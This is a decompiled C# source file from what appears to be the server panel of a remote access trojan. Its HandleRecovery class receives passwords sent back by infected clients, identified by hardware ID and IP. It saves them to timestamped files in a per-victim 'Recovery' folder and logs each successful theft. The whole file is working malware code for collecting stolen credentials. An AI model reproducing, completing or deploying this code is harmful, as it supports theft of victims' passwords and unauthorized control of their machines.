using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000074 RID: 116
	public class HandleRecovery
	{
		// Token: 0x0600040D RID: 1037 RVA: 0x00025CE0 File Offset: 0x00023EE0
		public HandleRecovery(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
				string asString = unpack_msgpack.ForcePathObject("Password").AsString;
				if (!string.IsNullOrWhiteSpace(asString))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllText(text + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" recovered passwords successfully @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ Recovery"
					}), Color.Gainsboro);
				}
				else
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " has no passwords", Color.Gainsboro);
				}
				if (client != null)
				{
					client.Disconnected();
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Gainsboro);
			}
		}
	}
}
